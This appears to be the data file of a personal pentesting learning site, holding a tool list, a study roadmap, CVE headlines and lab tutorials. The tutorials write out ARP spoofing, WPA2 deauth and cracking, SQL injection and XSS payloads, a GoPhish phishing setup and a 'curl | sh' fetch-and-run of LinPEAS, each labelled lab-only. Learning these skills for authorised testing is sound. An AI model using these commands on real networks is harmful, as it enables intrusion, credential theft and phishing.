/* ============================================================
   fsociety // armanxploits — script.js
   ============================================================ */

/* ============================================================
   DATA — TOOLS
   ============================================================ */

const TOOLS = [
  {
    n: "Nmap",
    c: "recon",
    d: "Host discovery, port scanning, OS & service detection.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
  {
    n: "Metasploit",
    c: "exploit",
    d: "The exploitation framework. Full MCP integration on the box.",
    t: "Exploit",
    s: "live",
    st: "MCP active",
  },
  {
    n: "Burp Suite Pro",
    c: "web",
    d: "Intercepting proxy, scanner, intruder, repeater. Java 21.",
    t: "Web",
    s: "ok",
    st: "licensed",
  },
  {
    n: "Aircrack-ng",
    c: "wireless",
    d: "WPA/WPA2 capture & cracking. MCP-integrated, wlan0.",
    t: "Wireless",
    s: "live",
    st: "MCP active",
  },
  {
    n: "Bettercap",
    c: "wireless",
    d: "MitM, ARP/DNS spoofing, network recon. Written in Go.",
    t: "MitM",
    s: "ok",
    st: "configured",
  },
  {
    n: "OWASP ZAP",
    c: "web",
    d: "Open-source web scanner — good automated companion to Burp.",
    t: "Web",
    s: "learn",
    st: "learning",
  },
  {
    n: "Wireshark",
    c: "recon",
    d: "Deep packet inspection for ARP, DNS and forensics.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
  {
    n: "SecLists",
    c: "recon",
    d: "Wordlists for assessments. /usr/share/seclists/.",
    t: "Lists",
    s: "ok",
    st: "installed",
  },
  {
    n: "tmux",
    c: "misc",
    d: "Terminal multiplexer for juggling engagement sessions.",
    t: "Misc",
    s: "ok",
    st: "configured",
  },
  {
    n: "John the Ripper",
    c: "exploit",
    d: "Password cracker. Pairs with Hashcat for GPU work.",
    t: "Exploit",
    s: "learn",
    st: "learning",
  },
  {
    n: "Gobuster",
    c: "recon",
    d: "Directory, DNS & vhost busting in Go. Web-recon staple.",
    t: "Recon",
    s: "learn",
    st: "learning",
  },
  {
    n: "Obsidian",
    c: "misc",
    d: "Cross-linked knowledge vault for everything above.",
    t: "Notes",
    s: "ok",
    st: "active vault",
  },
  {
    n: "Hashcat",
    c: "exploit",
    d: "GPU-accelerated password cracking. Pairs with John.",
    t: "Exploit",
    s: "learn",
    st: "learning",
  },
  {
    n: "Impacket",
    c: "exploit",
    d: "Python classes for SMB, Kerberos, LDAP. AD goldmine.",
    t: "Exploit",
    s: "learn",
    st: "learning",
  },
  {
    n: "BloodHound",
    c: "recon",
    d: "AD attack path mapping via graph visualisation.",
    t: "AD",
    s: "learn",
    st: "learning",
  },
  {
    n: "ffuf",
    c: "recon",
    d: "Fast web fuzzer written in Go. Successor to wfuzz.",
    t: "Recon",
    s: "learn",
    st: "learning",
  },
];

/* ============================================================
   DATA — ROADMAP
   ============================================================ */
const PHASES = [
  {
    code: "00",
    title: "Recon — Foundations",
    sub: "prereq for everything",
    nodes: [
      {
        id: "net",
        label: "Networking",
        track: "found",
        blurb: "How packets actually move.",
        why: "Every attack rides on a protocol. If you don't understand the network, you're guessing.",
        topics: [
          "OSI & TCP/IP",
          "subnetting",
          "DNS / DHCP / ARP",
          "HTTP/S",
          "ports & services",
        ],
        res: [
          {
            n: "Professor Messer — Network+",
            u: "https://www.professormesser.com/",
          },
          {
            n: "PracticalNetworking.net",
            u: "https://www.practicalnetworking.net/",
          },
        ],
      },
      {
        id: "lin",
        label: "Linux",
        track: "found",
        blurb: "Your home turf.",
        why: "Kali, servers, and most targets run Linux. Live in the shell until it's muscle memory.",
        topics: [
          "filesystem & permissions",
          "bash navigation",
          "processes & services",
          "package mgmt",
          "SSH",
        ],
        res: [
          {
            n: "OverTheWire: Bandit",
            u: "https://overthewire.org/wargames/bandit/",
          },
          { n: "Linux Journey", u: "https://linuxjourney.com/" },
        ],
      },
      {
        id: "win",
        label: "Windows",
        track: "found",
        blurb: "The enterprise target.",
        why: "Corporate networks are Windows + Active Directory. You'll spend a career here.",
        topics: [
          "CMD & PowerShell",
          "users & groups",
          "registry",
          "SMB",
          "Windows internals",
        ],
        res: [
          {
            n: "Microsoft Learn — PowerShell",
            u: "https://learn.microsoft.com/powershell/",
          },
        ],
      },
      {
        id: "prog",
        label: "Scripting",
        track: "found",
        blurb: "Automate or fall behind.",
        why: "Python & Bash turn a 3-hour task into a 3-line script and let you read others' tooling.",
        topics: [
          "Python basics",
          "Bash scripting",
          "requests / sockets",
          "regex",
          "reading source",
        ],
        res: [
          {
            n: "Automate the Boring Stuff",
            u: "https://automatetheboringstuff.com/",
          },
        ],
      },
    ],
  },
  {
    code: "01",
    title: "Foothold — Core Security",
    sub: "the mental model",
    nodes: [
      {
        id: "princ",
        label: "Security Principles",
        track: "found",
        blurb: "CIA, threat models.",
        why: "You can't defend or attack what you can't categorise. This is the vocabulary of the field.",
        topics: [
          "CIA triad",
          "threat modelling",
          "attack surface",
          "defence in depth",
          "risk",
        ],
        res: [{ n: "OWASP — Concepts", u: "https://owasp.org/" }],
      },
      {
        id: "crypto",
        label: "Cryptography",
        track: "found",
        blurb: "What protects data.",
        why: "Hashing, TLS, and key exchange show up in every engagement — and so do their misuses.",
        topics: [
          "hashing vs encryption",
          "symmetric/asymmetric",
          "TLS",
          "JWT",
          "common pitfalls",
        ],
        res: [
          { n: "Crypto101", u: "https://www.crypto101.io/" },
          { n: "Cryptopals", u: "https://cryptopals.com/" },
        ],
      },
      {
        id: "webf",
        label: "Web Fundamentals",
        track: "found",
        blurb: "How the web really works.",
        why: "Most bug bounty money is on the web. Sessions, cookies and the same-origin policy are the playground.",
        topics: [
          "HTTP methods",
          "cookies & sessions",
          "CORS / SOP",
          "headers",
          "auth flows",
        ],
        res: [{ n: "MDN Web Docs", u: "https://developer.mozilla.org/" }],
      },
    ],
  },
  {
    code: "02",
    title: "Escalation — Offensive Skills",
    sub: "the craft",
    nodes: [
      {
        id: "webp",
        label: "Web App Pentesting",
        track: "off",
        blurb: "OWASP Top 10 in your hands.",
        why: "The deepest, most rewarded offensive skill for beginners. Start here to get traction fast.",
        topics: [
          "XSS",
          "SQL injection",
          "SSRF",
          "IDOR / access control",
          "auth bypass",
          "file upload",
        ],
        res: [
          {
            n: "PortSwigger Web Academy",
            u: "https://portswigger.net/web-security",
          },
          { n: "OWASP Top 10", u: "https://owasp.org/www-project-top-ten/" },
        ],
      },
      {
        id: "netp",
        label: "Network Pentesting",
        track: "off",
        blurb: "Pivot through infrastructure.",
        why: "Internal networks are where red teams earn their keep — enumeration, services, lateral movement.",
        topics: [
          "service enumeration",
          "SMB / RPC",
          "tunnelling & pivoting",
          "relay basics",
        ],
        res: [
          {
            n: "TryHackMe — Jr Pentester",
            u: "https://tryhackme.com/path/outline/jrpenetrationtester",
          },
          { n: "HTB Academy", u: "https://academy.hackthebox.com/" },
        ],
      },
      {
        id: "ad",
        label: "Active Directory",
        track: "off",
        blurb: "The enterprise endgame.",
        why: "AD is the heart of corporate networks. Owning it is the difference between a vuln and a breach.",
        topics: [
          "Kerberos basics",
          "BloodHound",
          "ACL abuse",
          "lateral movement",
          "persistence",
        ],
        res: [
          { n: "TryHackMe — AD path", u: "https://tryhackme.com/" },
          { n: "BloodHound docs", u: "https://bloodhound.readthedocs.io/" },
        ],
      },
      {
        id: "wifi",
        label: "Wireless",
        track: "off",
        blurb: "Attacks over the air.",
        why: "WPA2 capture, evil-twin and deauth — physical-adjacent attacks every pentester should understand.",
        topics: [
          "monitor mode",
          "handshake capture",
          "WPA2 cracking",
          "evil twin theory",
        ],
        res: [
          { n: "Aircrack-ng wiki", u: "https://www.aircrack-ng.org/doku.php" },
        ],
      },
      {
        id: "priv",
        label: "Privilege Escalation",
        track: "off",
        blurb: "Low shell → root.",
        why: "Initial access is rarely admin. PrivEsc is what turns a foothold into a finding.",
        topics: [
          "SUID & sudo abuse",
          "kernel exploits",
          "cron / services",
          "GTFOBins",
          "Windows tokens",
        ],
        res: [
          { n: "GTFOBins", u: "https://gtfobins.github.io/" },
          { n: "HackTricks", u: "https://book.hacktricks.xyz/" },
        ],
      },
      {
        id: "osint",
        label: "OSINT & Recon",
        track: "off",
        blurb: "Know before you go.",
        why: "Half the engagement is reconnaissance. Public data builds the map you'll attack on.",
        topics: [
          "footprinting",
          "subdomain enum",
          "metadata",
          "Google dorking",
          "people search",
        ],
        res: [{ n: "OSINT Framework", u: "https://osintframework.com/" }],
      },
    ],
  },
  {
    code: "03",
    title: "Proving Ground — Practice",
    sub: "reps, reps, reps",
    nodes: [
      {
        id: "ps",
        label: "PortSwigger Labs",
        track: "practice",
        blurb: "Free, world-class web labs.",
        why: "The single best free resource to drill web vulns until they're reflex.",
        topics: ["per-vuln labs", "apprentice→expert", "mystery labs"],
        res: [
          {
            n: "Web Security Academy",
            u: "https://portswigger.net/web-security/all-labs",
          },
        ],
      },
      {
        id: "thm",
        label: "TryHackMe",
        track: "practice",
        blurb: "Guided, beginner-friendly.",
        why: "Structured paths with hand-holding — perfect for building confidence early.",
        topics: ["learning paths", "guided rooms", "beginner CTFs"],
        res: [{ n: "TryHackMe", u: "https://tryhackme.com/" }],
      },
      {
        id: "htb",
        label: "HackTheBox",
        track: "practice",
        blurb: "Less hand-holding, more real.",
        why: "Closer to a real engagement. Starting Point eases you in; retired boxes have writeups.",
        topics: ["Starting Point", "retired machines", "HTB Academy"],
        res: [{ n: "HackTheBox", u: "https://www.hackthebox.com/" }],
      },
      {
        id: "ctf",
        label: "CTFs",
        track: "practice",
        blurb: "Compete, learn fast.",
        why: "Time-boxed pressure exposes gaps faster than anything. picoCTF is the gentle on-ramp.",
        topics: ["picoCTF", "CTFtime events", "writeups"],
        res: [
          { n: "picoCTF", u: "https://picoctf.org/" },
          { n: "CTFtime", u: "https://ctftime.org/" },
        ],
      },
    ],
  },
  {
    code: "04",
    title: "Credentials — Certs",
    sub: "prove it on paper",
    nodes: [
      {
        id: "secp",
        label: "CompTIA Security+",
        track: "career",
        blurb: "The HR door-opener.",
        why: "Baseline credential many job filters require. Broad, vendor-neutral, good first cert.",
        topics: ["broad fundamentals", "entry-level filter", "DoD 8570"],
        res: [
          {
            n: "CompTIA Security+",
            u: "https://www.comptia.org/certifications/security",
          },
        ],
      },
      {
        id: "ejpt",
        label: "INE eJPT",
        track: "career",
        blurb: "First practical pentest cert.",
        why: "Beginner-friendly, fully hands-on. Proves you can actually run a basic assessment.",
        topics: ["practical exam", "networks + web", "beginner-tier"],
        res: [
          {
            n: "INE eJPT",
            u: "https://security.ine.com/certifications/ejpt-certification/",
          },
        ],
      },
      {
        id: "pnpt",
        label: "TCM PNPT",
        track: "career",
        blurb: "Realistic engagement + report.",
        why: "5-day exam ending in a debrief and a real report. Loved for being true-to-job.",
        topics: ["external→internal", "AD focus", "report + debrief"],
        res: [
          {
            n: "TCM Security PNPT",
            u: "https://certifications.tcm-sec.com/pnpt/",
          },
        ],
      },
      {
        id: "oscp",
        label: "OffSec OSCP",
        track: "career",
        blurb: "The industry benchmark.",
        why: 'The cert most pentest roles still anchor to. Brutal 24h exam — "try harder."',
        topics: ["24h practical", "try harder", "PEN-200"],
        res: [
          { n: "OffSec OSCP", u: "https://www.offsec.com/courses/pen-200/" },
        ],
      },
      {
        id: "bscp",
        label: "PortSwigger BSCP",
        track: "career",
        blurb: "Web-specialist proof.",
        why: "If web is your lane, BSCP backs the PortSwigger labs with a recognised credential.",
        topics: ["web-focused", "practical", "Burp mastery"],
        res: [
          {
            n: "Burp Suite Certified Practitioner",
            u: "https://portswigger.net/web-security/certification",
          },
        ],
      },
    ],
  },
  {
    code: "05",
    title: "Operator — Career",
    sub: "do it for real",
    nodes: [
      {
        id: "report",
        label: "Reporting",
        track: "career",
        blurb: "The deliverable that pays.",
        why: "Clients buy reports, not shells. Clear writeups are what separate juniors from pros.",
        topics: [
          "findings & severity",
          "CVSS",
          "remediation advice",
          "exec summaries",
        ],
        res: [
          {
            n: "TCM — report templates",
            u: "https://github.com/hmaverickadams",
          },
        ],
      },
      {
        id: "bb",
        label: "Bug Bounty",
        track: "career",
        blurb: "Get paid to learn.",
        why: "Real targets, real payouts, with explicit scope. The best ongoing practice that pays.",
        topics: ["scope & rules", "recon at scale", "disclosure etiquette"],
        res: [
          { n: "HackerOne", u: "https://www.hackerone.com/" },
          { n: "Bugcrowd", u: "https://www.bugcrowd.com/" },
        ],
      },
      {
        id: "red",
        label: "Red Teaming",
        track: "career",
        blurb: "Adversary simulation.",
        why: "Beyond pentesting — full-scope, stealth, objectives. The senior offensive track.",
        topics: [
          "TTPs & MITRE ATT&CK",
          "evasion",
          "C2 concepts",
          "purple teaming",
        ],
        res: [{ n: "MITRE ATT&CK", u: "https://attack.mitre.org/" }],
      },
      {
        id: "spec",
        label: "Specialise",
        track: "career",
        blurb: "Pick a deep lane.",
        why: "Generalists get hired; specialists get remembered. Cloud, mobile, OT, or appsec — go deep.",
        topics: ["cloud (AWS/Azure)", "mobile", "OT/ICS", "malware / RE"],
        res: [
          {
            n: "roadmap.sh — Cyber Security",
            u: "https://roadmap.sh/cyber-security",
          },
        ],
      },
    ],
  },
];

/* ============================================================
   DATA — NOTES
   ============================================================ */
const NOTES = {
  mitm: {
    title: "MitM with Bettercap",
    meta: "updated 2024 · lab only",
    secs: [
      {
        h: "ARP Spoofing (lab)",
        code: `# enable forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\nsudo bettercap -iface eth0\n# in REPL:\nnet.probe on\nnet.recon on\nset arp.spoof.targets 192.168.1.10\narp.spoof on\nnet.sniff on`,
      },
      {
        h: "Why it works",
        list: [
          "ARP has no authentication — anyone can claim any IP",
          "poison both directions: victim↔gateway",
          "verify the flow in Wireshark",
          "always restore ARP tables after",
        ],
      },
    ],
  },
  wifi: {
    title: "WPA2 Handshake Capture",
    meta: "updated 2024 · your own AP",
    secs: [
      {
        h: "Monitor mode",
        code: `sudo airmon-ng check kill\nsudo airmon-ng start wlan0\niwconfig wlan0mon`,
      },
      {
        h: "Capture + crack",
        code: `sudo airodump-ng wlan0mon\nsudo airodump-ng -c [CH] --bssid [AP] -w cap wlan0mon\n# deauth your own client to force a reconnect\nsudo aireplay-ng --deauth 5 -a [AP] wlan0mon\naircrack-ng cap-01.cap -w /usr/share/wordlists/rockyou.txt`,
      },
    ],
  },
  web: {
    title: "Web Pentest Methodology",
    meta: "PortSwigger + personal",
    secs: [
      {
        h: "Recon",
        code: `gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/common.txt\ngobuster dns -d target -w .../subdomains-top1million.txt\nwhatweb http://target`,
      },
      {
        h: "DOM XSS notes",
        list: [
          "watch innerHTML / document.write sinks",
          "source: location.hash, search, referrer",
          "test in your own lab instance only",
          "map every sink before crafting payloads",
        ],
      },
    ],
  },
  recon: {
    title: "Nmap Host Discovery",
    meta: "personal notes",
    secs: [
      {
        h: "Core scans",
        code: `nmap -sn 192.168.1.0/24        # ping sweep\nsudo nmap -sS -p- 192.168.1.5  # full SYN\nsudo nmap -sV -O 192.168.1.5   # versions + OS\nnmap -A 192.168.1.5            # aggressive\nnmap --script vuln 192.168.1.5\nnmap -oN scan.txt 192.168.1.5  # save`,
      },
    ],
  },
  privesc: {
    title: "Linux PrivEsc Checklist",
    meta: "personal + HTB/THM",
    secs: [
      {
        h: "Enumerate",
        code: `# LinPEAS in a lab box\ncurl -L .../linpeas.sh | sh\nsudo -l\nfind / -perm -4000 2>/dev/null\ncat /etc/crontab`,
      },
      {
        h: "Quick wins",
        list: [
          "sudo -l → NOPASSWD entries",
          "SUID binaries → check GTFOBins",
          "world-writable cron scripts",
          "creds in config / history",
          "kernel version (uname -a)",
        ],
      },
    ],
  },
};

/* ============================================================
   DATA — TUTORIALS
   ============================================================ */
const TUTORIALS = {
  recon: [
    {
      title: "Nmap Full Recon Workflow",
      diff: "beg",
      desc: "Step-by-step from host discovery to vulnerability scanning on a lab machine. Never run on unauthorised targets.",
      steps: [
        {
          h: "Ping sweep — find live hosts",
          p: "First identify what's alive on the subnet.",
          code: `nmap -sn 192.168.1.0/24\n# output: hosts that respond to probes`,
        },
        {
          h: "SYN scan top 1000 ports",
          p: "Fast, stealthy SYN scan. Requires root.",
          code: `sudo nmap -sS 192.168.1.50\n# -sS = TCP SYN (half-open)`,
        },
        {
          h: "Service & version detection",
          p: "Identify what's running on each port.",
          code: `sudo nmap -sV -O -p- 192.168.1.50\n# -sV = service version\n# -O  = OS detection\n# -p- = all 65535 ports`,
        },
        {
          h: "Script scan for vulnerabilities",
          p: "Run NSE scripts against discovered services.",
          code: `nmap --script vuln 192.168.1.50\nnmap --script=smb-vuln-* 192.168.1.50\nnmap -A -oN scan-results.txt 192.168.1.50`,
        },
      ],
      tags: ["Nmap", "Recon", "Lab"],
      warn: "Lab environments only. Scanning networks without permission is illegal.",
    },
    {
      title: "Subdomain Enumeration",
      diff: "int",
      desc: "Map the attack surface by enumerating subdomains on a target domain you own or have written permission to test.",
      steps: [
        {
          h: "Passive recon with crt.sh",
          p: "Certificate transparency logs reveal registered subdomains.",
          code: `curl -s "https://crt.sh/?q=%.example.com&output=json" \\\n  | jq -r '.[].name_value' | sort -u`,
        },
        {
          h: "Active brute-force with gobuster",
          p: "DNS brute-force against your own domain.",
          code: `gobuster dns -d example.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -t 50 --timeout 3s`,
        },
        {
          h: "ffuf for vhost discovery",
          p: "Find virtual hosts on an IP you control.",
          code: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -u http://TARGET_IP -H "Host: FUZZ.example.com" \\\n  -fs [default_response_size]`,
        },
      ],
      tags: ["Gobuster", "ffuf", "OSINT"],
      warn: "Written authorisation required. Passive crt.sh queries are safe; active scanning is not.",
    },
  ],
  webpwn: [
    {
      title: "XSS Hunting — Reflected & DOM",
      diff: "int",
      desc: "Methodology for finding and confirming Cross-Site Scripting vulnerabilities in controlled lab environments like PortSwigger.",
      steps: [
        {
          h: "Map entry points",
          p: "List every place user input appears in the response — forms, URL params, headers.",
          code: `# In Burp: use Proxy history + search for reflected params\n# Look for input appearing unencoded in HTML response`,
        },
        {
          h: "Test basic payload",
          p: "Confirm reflection with a harmless probe first.",
          code: `# Probe payload:\n"><h1>test</h1>\n# If <h1> appears in source — potential XSS sink`,
        },
        {
          h: "DOM-based XSS: find sinks",
          p: "Check JavaScript source for dangerous sinks.",
          code: `# Dangerous sinks:\n# innerHTML, document.write, eval()\n# location.href, element.src\n\n# Source code search:\ngrep -r "innerHTML\\|document.write\\|eval(" .`,
        },
        {
          h: "Confirm with alert payload",
          p: "Only in labs you own or have permission to test.",
          code: `<script>alert(document.domain)</script>\n\n# DOM-based:\n#?search=<img src=x onerror=alert(1)>\n# location.hash: #<img src=x onerror=alert(1)>`,
        },
      ],
      tags: ["XSS", "Burp", "PortSwigger"],
      warn: "Only test on PortSwigger labs, DVWA, or targets you explicitly own and have permission to test.",
    },
    {
      title: "SQL Injection — Manual to sqlmap",
      diff: "int",
      desc: "Manual detection followed by automation. Run against DVWA or your own lab, never production systems.",
      steps: [
        {
          h: "Find injectable parameter",
          p: "Look for numeric IDs, search boxes, login fields.",
          code: `# Test with a single quote:\nhttps://lab.local/item?id=1'\n# Signs of SQLi: DB error, empty response, response diff`,
        },
        {
          h: "Determine database type",
          p: "Different DBs have different comment syntax.",
          code: `# MySQL:\nhttps://lab.local/item?id=1--+\nhttps://lab.local/item?id=1 AND 1=1--+\n\n# Error-based detection:\nhttps://lab.local/item?id=1 AND EXTRACTVALUE(1,CONCAT(0x5c,version()))`,
        },
        {
          h: "UNION-based data extraction",
          p: "Enumerate columns, then extract data.",
          code: `# Find column count:\nhttps://lab.local/item?id=1 ORDER BY 3--+\n\n# UNION extract:\nhttps://lab.local/item?id=0 UNION SELECT 1,user(),database()--+`,
        },
        {
          h: "Automate with sqlmap",
          p: "Use sqlmap only on authorised targets.",
          code: `sqlmap -u "http://lab.local/item?id=1" \\\n  --dbs --batch --level=3\nsqlmap -u "http://lab.local/item?id=1" \\\n  -D targetdb --tables --dump`,
        },
      ],
      tags: ["SQLi", "sqlmap", "DVWA"],
      warn: "SQL injection against production systems without explicit written consent is a criminal offence. Lab/CTF only.",
    },
  ],
  wireless: [
    {
      title: "WPA2 Handshake Capture & Crack",
      diff: "int",
      desc: "Full workflow on your own access point in monitor mode. Requires a compatible wireless adapter.",
      steps: [
        {
          h: "Put adapter in monitor mode",
          p: "Kill conflicting processes first.",
          code: `sudo airmon-ng check kill\nsudo airmon-ng start wlan0\n# Confirm:\niwconfig wlan0mon`,
        },
        {
          h: "Find your target AP",
          p: "Scan for access points — target your own SSID.",
          code: `sudo airodump-ng wlan0mon\n# Note: BSSID (MAC), Channel (CH), ESSID (name)`,
        },
        {
          h: "Capture handshake",
          p: "Focus on your AP and deauth a connected client.",
          code: `sudo airodump-ng -c [CHANNEL] --bssid [AP_BSSID] \\\n  -w handshake wlan0mon\n\n# In a second terminal — deauth YOUR device:\nsudo aireplay-ng --deauth 5 -a [AP_BSSID] wlan0mon\n\n# Watch for: WPA handshake: [BSSID] in airodump header`,
        },
        {
          h: "Crack the handshake",
          p: "Dictionary attack against the captured .cap file.",
          code: `aircrack-ng handshake-01.cap \\\n  -w /usr/share/wordlists/rockyou.txt\n\n# GPU-accelerated with Hashcat:\nhashcat -m 22000 handshake-01.cap rockyou.txt`,
        },
      ],
      tags: ["Aircrack-ng", "Hashcat", "Wireless"],
      warn: "Only against your own access point. Capturing traffic on others' networks is a criminal offence.",
    },
  ],
  privesc: [
    {
      title: "Linux PrivEsc — Full Checklist",
      diff: "adv",
      desc: "Systematic escalation from a low-priv shell to root in a CTF or lab environment. Walk through every vector.",
      steps: [
        {
          h: "Basic enumeration",
          p: "Understand the system and your position.",
          code: `id && whoami\nuname -a && cat /etc/os-release\nip a && ss -tulnp\ncat /etc/passwd | grep -v nologin`,
        },
        {
          h: "Sudo & SUID abuse",
          p: "Most common quick wins.",
          code: `sudo -l\n# If NOPASSWD — check GTFOBins immediately\n\n# SUID binaries:\nfind / -perm -4000 -type f 2>/dev/null\n# GTFOBins lookup: https://gtfobins.github.io/`,
        },
        {
          h: "Cron & writable paths",
          p: "Find cron jobs running as root that use writable scripts.",
          code: `cat /etc/crontab\nls -la /etc/cron.d/\ncrontab -l\n\n# Find world-writable files:\nfind / -writable -type f 2>/dev/null | grep -v proc`,
        },
        {
          h: "Run LinPEAS",
          p: "Automated enumeration covers everything above and more.",
          code: `# Transfer to target:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# or:\nwget -O linpeas.sh https://[YOUR_HOST]/linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee /tmp/linpeas.out`,
        },
      ],
      tags: ["PrivEsc", "LinPEAS", "GTFOBins"],
      warn: "Lab/CTF environments only. Privilege escalation on production systems requires written authorisation.",
    },
  ],
  social: [
    {
      title: "Phishing Campaign Setup",
      diff: "int",
      desc: "Educational walkthrough of phishing infrastructure used in authorised red team engagements.",
      steps: [
        {
          h: "GoPhish server setup",
          p: "Open-source phishing simulation platform.",
          code: "# Download from github.com/gophish/gophish\nchmod +x gophish && ./gophish\n# Web UI: https://127.0.0.1:3333\n# Create: Sending Profile → Email Template → Landing Page → Campaign",
        },
        {
          h: "theHarvester target recon",
          p: "Find email formats before crafting lures.",
          code: "theHarvester -d target.com -b linkedin,google,bing\n# Infer format: firstname.lastname@domain.com",
        },
        {
          h: "Measure & report",
          p: "The point is awareness — report click rates, not exploit.",
          code: "# GoPhish dashboard shows:\n# Emails Sent / Opened / Clicked / Submitted\n# Output to CSV for engagement report",
        },
      ],
      tags: ["GoPhish", "Phishing", "Red Team"],
      warn: "Phishing simulations require explicit written authorisation from the target organisation.",
    },
  ],
  forensics: [
    {
      title: "Incident Response — First Responder",
      diff: "int",
      desc: "Steps to preserve and collect evidence from a potentially compromised Linux system. Order matters — most volatile first.",
      steps: [
        {
          h: "Volatile data first",
          p: "Capture RAM and running state before anything touches disk.",
          code: '# Live memory:\nsudo insmod lime-$(uname -r).ko "path=/mnt/evidence/memory.lime format=lime"\nps auxf > processes.txt\nss -tulnp > netstat.txt\nlsof > open_files.txt',
        },
        {
          h: "Disk image",
          p: "Never analyse originals — image first.",
          code: "sudo dcfldd if=/dev/sda of=/mnt/external/disk.img bs=512 hash=sha256 hashlog=hash.log\nsha256sum /dev/sda | tee hash-original.txt",
        },
        {
          h: "Log collection",
          p: "Grab key directories and logs before imaging.",
          code: "tar -czf /mnt/evidence/logs.tar.gz /var/log/\ncp /etc/passwd /etc/shadow /etc/crontab /mnt/evidence/\nfind / -mtime -7 -type f 2>/dev/null > recent_files.txt",
        },
      ],
      tags: ["IR", "Forensics", "Evidence"],
      warn: "Only on systems you are authorised to examine.",
    },
  ],
};

/* ============================================================
   DATA — ATTACK TREES
   ============================================================ */
const ATTACK_TREES = {
  webapp: {
    label: "Web App Attack Chain",
    nodes: [
      {
        id: "r",
        label: "Recon",
        x: 60,
        y: 200,
        color: "#d8392b",
        children: ["inf", "subdom"],
      },
      {
        id: "inf",
        label: "Info Gather",
        x: 220,
        y: 100,
        color: "#c08a3e",
        children: ["burp"],
      },
      {
        id: "subdom",
        label: "Subdomain Enum",
        x: 220,
        y: 300,
        color: "#c08a3e",
        children: ["vhost"],
      },
      {
        id: "burp",
        label: "Burp Intercept",
        x: 400,
        y: 80,
        color: "#4ab8c1",
        children: ["vuln"],
      },
      {
        id: "vhost",
        label: "VHost Discovery",
        x: 400,
        y: 200,
        color: "#4ab8c1",
        children: ["vuln"],
      },
      {
        id: "vuln",
        label: "Vuln Scan",
        x: 580,
        y: 140,
        color: "#d8392b",
        children: ["xss", "sqli", "ssrf"],
      },
      {
        id: "xss",
        label: "XSS",
        x: 740,
        y: 60,
        color: "#9b6fd4",
        children: ["impact"],
      },
      {
        id: "sqli",
        label: "SQLi",
        x: 740,
        y: 160,
        color: "#9b6fd4",
        children: ["impact"],
      },
      {
        id: "ssrf",
        label: "SSRF",
        x: 740,
        y: 260,
        color: "#9b6fd4",
        children: ["impact"],
      },
      {
        id: "impact",
        label: "Impact / Report",
        x: 920,
        y: 160,
        color: "#8fb98a",
        children: [],
      },
    ],
  },
  network: {
    label: "Network Pentest Chain",
    nodes: [
      {
        id: "r",
        label: "Footprinting",
        x: 60,
        y: 200,
        color: "#d8392b",
        children: ["nmap", "osint"],
      },
      {
        id: "nmap",
        label: "Nmap Scan",
        x: 220,
        y: 100,
        color: "#c08a3e",
        children: ["svc"],
      },
      {
        id: "osint",
        label: "OSINT",
        x: 220,
        y: 300,
        color: "#c08a3e",
        children: ["creds"],
      },
      {
        id: "svc",
        label: "Service Enum",
        x: 400,
        y: 100,
        color: "#4ab8c1",
        children: ["vuln"],
      },
      {
        id: "creds",
        label: "Credential Spray",
        x: 400,
        y: 300,
        color: "#4ab8c1",
        children: ["access"],
      },
      {
        id: "vuln",
        label: "Exploit Search",
        x: 580,
        y: 60,
        color: "#d8392b",
        children: ["access"],
      },
      {
        id: "access",
        label: "Initial Access",
        x: 680,
        y: 200,
        color: "#9b6fd4",
        children: ["priv", "lat"],
      },
      {
        id: "priv",
        label: "PrivEsc",
        x: 840,
        y: 100,
        color: "#d8392b",
        children: ["persist"],
      },
      {
        id: "lat",
        label: "Lateral Move",
        x: 840,
        y: 300,
        color: "#d8392b",
        children: ["persist"],
      },
      {
        id: "persist",
        label: "Persistence",
        x: 980,
        y: 200,
        color: "#8fb98a",
        children: [],
      },
    ],
  },
  wireless: {
    label: "Wireless Attack Chain",
    nodes: [
      {
        id: "r",
        label: "Monitor Mode",
        x: 60,
        y: 180,
        color: "#d8392b",
        children: ["scan"],
      },
      {
        id: "scan",
        label: "AP Scan",
        x: 220,
        y: 180,
        color: "#c08a3e",
        children: ["hs", "evt"],
      },
      {
        id: "hs",
        label: "Handshake Cap",
        x: 400,
        y: 80,
        color: "#4ab8c1",
        children: ["crack"],
      },
      {
        id: "evt",
        label: "Evil Twin",
        x: 400,
        y: 280,
        color: "#4ab8c1",
        children: ["phish"],
      },
      {
        id: "crack",
        label: "Dict Crack",
        x: 600,
        y: 80,
        color: "#9b6fd4",
        children: ["lan"],
      },
      {
        id: "phish",
        label: "Captive Portal",
        x: 600,
        y: 280,
        color: "#9b6fd4",
        children: ["lan"],
      },
      {
        id: "lan",
        label: "LAN Access",
        x: 780,
        y: 180,
        color: "#8fb98a",
        children: [],
      },
    ],
  },
};

/* ============================================================
   DATA — THREAT TICKER
   ============================================================ */
const THREATS = [
  {
    sev: "crit",
    txt: "CVE-2024-3400 — Palo Alto PAN-OS OS command injection (CVSS 10.0)",
  },
  {
    sev: "high",
    txt: "CVE-2024-21887 — Ivanti Connect Secure command injection — active exploitation",
  },
  {
    sev: "crit",
    txt: "CVE-2024-1709 — ConnectWise ScreenConnect auth bypass (CVSS 10.0)",
  },
  {
    sev: "med",
    txt: "CVE-2023-4863 — libwebp heap buffer overflow — Chrome/Electron",
  },
  {
    sev: "high",
    txt: "CVE-2024-27198 — JetBrains TeamCity auth bypass — mass exploitation",
  },
  {
    sev: "crit",
    txt: "CVE-2021-44228 — Log4Shell — remains in active exploitation",
  },
  {
    sev: "high",
    txt: "CVE-2024-6387 — OpenSSH regreSSHion — race condition in glibc systems",
  },
  {
    sev: "med",
    txt: "CVE-2023-38545 — curl SOCKS5 heap overflow — update immediately",
  },
  { sev: "high", txt: "CVE-2024-0204 — Fortra GoAnywhere MFT auth bypass" },
  {
    sev: "crit",
    txt: "CVE-2023-44487 — HTTP/2 Rapid Reset — DDoS amplification",
  },
  {
    sev: "med",
    txt: "CISA KEV updated — 3 new actively exploited vulns added this week",
  },
  {
    sev: "high",
    txt: "CVE-2024-4577 — PHP CGI argument injection — Windows servers",
  },
];

/* ============================================================
